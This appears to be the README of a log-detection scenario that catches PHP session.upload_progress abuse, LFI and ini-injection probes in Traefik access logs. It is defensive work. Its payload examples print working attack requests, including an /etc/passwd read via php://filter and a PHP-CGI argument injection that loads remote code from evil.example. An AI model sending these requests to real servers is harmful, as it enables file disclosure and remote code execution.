Trigger scenario detecting probes and payloads of the PHP `session.upload_progress`
abuse chain, as well as PHP wrapper / ini directive injection, in HTTP access logs.

## Motivation

PHP with `session.upload_progress.enabled` left at its default (`On`) lets an
attacker write attacker-controlled content into a session file by sending a
multipart part named `PHP_SESSION_UPLOAD_PROGRESS`. Combined with any local
file inclusion or log poisoning primitive, this becomes a reliable RCE.

This scenario catches the **URL-visible** half of the technique: LFI and
ini-injection payloads sent in the query string or path (for example
`?p=php://filter/read=convert.base64-encode/resource=...`, `auto_prepend_file=`,
`allow_url_include=`, `PHP_VALUE=`, `php-cgi`, and the `%AD%AD` soft-hyphen
obfuscation used by PHP-CGI argument-injection exploits).

The body-side signature (`PHP_SESSION_UPLOAD_PROGRESS` in a multipart body)
cannot be seen in access logs; it is covered by the appsec rule
`danielpetrica/php-upload-progress` in this collection.

## Payload examples

```text
GET /index.php?p=php://filter/resource=../../etc/passwd HTTP/1.1
GET /index.php?auto_prepend_file=/tmp/pwn HTTP/1.1
POST /cgi-bin/php?%2Dd%20allow_url_include%3DOn%20%2Dd%20auto_prepend_file%3Dhttp://evil.example/x%20%2Dn HTTP/1.1
```

## Remediation

IP-block the source. Also disable `session.upload_progress.enabled` in
`php.ini` until the relevant vulnerability is patched.

## Acquisition

```yaml
filenames:
  - /var/log/traefik/access.log
labels:
  type: traefik
```
